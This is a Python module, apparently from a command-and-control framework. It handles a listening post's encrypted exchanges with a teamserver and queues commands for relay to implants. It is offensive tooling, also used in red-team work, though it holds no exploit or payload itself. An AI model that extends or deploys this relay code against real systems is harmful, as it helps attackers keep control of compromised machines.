from lib import instructions
from lib import transmit
from lib import implants
from lib.crypto import asymmetric


def _get_transport_index(listener, transport_id):
    try:
        transport_index = next(index for (index, transport) in enumerate(listener.transports) if transport.transport_id == transport_id)
        return transport_index
    except StopIteration:
        listener.logging.log(f"{transport_id} not found!",
                             level="error", source="lib.implants")
        pass


def send_manifest(frame, listener):
    """
    RECEIVES: Request for a manifest, Teamserver pubkey for next transaction
    SENDS: Listening post manifest, LP pubkey use for next transaction
    SETS: TS pubkey, LP keypair

    :param frame:
    :param listener:
    :return:
    """
    listener.ts_pubkey = asymmetric.public_key_from_bytes(str(frame['args'][0]['tpk']))
    # TODO: HIGH_PRI: Make a listener.manifest
    data = {'component_id': listener.component_id, "cmd": "lpm", "args": [listener.manifest, {"lpk": listener.initial_public_key._public_key}],
            "txid": frame['txid']}
    instruction_frame = instructions.create_instruction_frame(data)
    # TODO: value setting
    reply_frame = transmit.cook_transmit_frame(listener, instruction_frame, "teamserver")
    return reply_frame


def send_initialization(listener):
    """
    RECEIVES: None
    SENDS: Listening post initialization, Listening post pubkey for next transaction
    SETS: LP Keypair, LP State
    :return:
    """
    data = {'component_id': listener.component_id, "cmd": "lpi", "args":[{"lpk": listener.initial_public_key._public_key}]}
    instruction_frame = instructions.create_instruction_frame(data)
    reply_frame = transmit.cook_sealed_frame(listener, instruction_frame)
    return reply_frame


def rekey(frame, listener):
    data = {'component_id': listener.component_id, "cmd": "rko", "args":[{"lpk": listener.initial_public_key._public_key}]}

    listener.ts_pubkey = asymmetric.public_key_from_bytes(listener.config.config['crypto']['ts_pk'])
    listener.current_private_key = listener.initial_private_key
    listener.current_public_key = listener.initial_public_key

    instruction_frame = instructions.create_instruction_frame(data)
    reply_frame = transmit.cook_transmit_frame(listener, instruction_frame, "teamserver")
    return reply_frame


def initialized(frame, listener):
    reply_frame = None
    listener.current_ts_pubkey = asymmetric.public_key_from_bytes(str(frame['args'][0]['tpk']))
    listener.listening_post.status = "READY"
    return reply_frame


def noop(frame, listener):
    reply_frame = None
    listener.current_ts_pubkey = asymmetric.public_key_from_bytes(str(frame['args'][0]['tpk']))
    return reply_frame


def request_command(listener):
    """
    RECEIVES: None
    SENDS: Implant commands to run, listening post pubkey for next transaction
    SETS: listener.cmd_queue, LP Keypair

    :param listener:
    :return:
    """
    # TODO: Technically we're shipping the lp privkey for each implant over, we should probably scrub it, but it doesn't really matter since it's gonna rotate after this transaction anyways
    data = {'component_id': listener.component_id, "cmd": "gcmd", "args":[{"lpk": listener.initial_public_key._public_key}, {"implants": listener.implants}]}
    instruction_frame = instructions.create_instruction_frame(data)
    reply_frame = transmit.cook_transmit_frame(listener, instruction_frame, "teamserver")
    return reply_frame


def receive_command(frame, listener):
    cmd_txids = []
    # Loop through each command in the list of received commands
    for command in frame['args'][0]:
        # First we get the index of the implant
        implant_index = implants._get_implant_index(listener, command['component_id'])
        # Now we can use that to set the implant's transport's ID in the command:
        command['transport_id'] = listener.implants[implant_index]['transport_id']
        # Now we'll ensure that the implant_id is set on the transport
        #  First we'll need the transport's index
        transport_index = _get_transport_index(listener, command['transport_id'])
        # Finally, we'll set the implant_id in the transport, we'll do this every time
        listener.transports[transport_index].implant_id = command['component_id']
        # Set the command state to "RELAYING"
        command['state'] = "RELAYING"
        listener.cmd_queue.append(command)
        cmd_txids.append(command['txid'])
    data = {'component_id': listener.component_id, "txid": frame['txid'], "cmd": "rcok",
            "args": [{"cmd_txids": cmd_txids}, {"lpk": listener.current_public_key._public_key}]}
    listener.current_ts_pubkey = asymmetric.public_key_from_bytes(str(frame['args'][1]['tpk']))
    instruction_frame = instructions.create_instruction_frame(data)
    reply_frame = transmit.cook_transmit_frame(listener, instruction_frame, "teamserver")
    return reply_frame
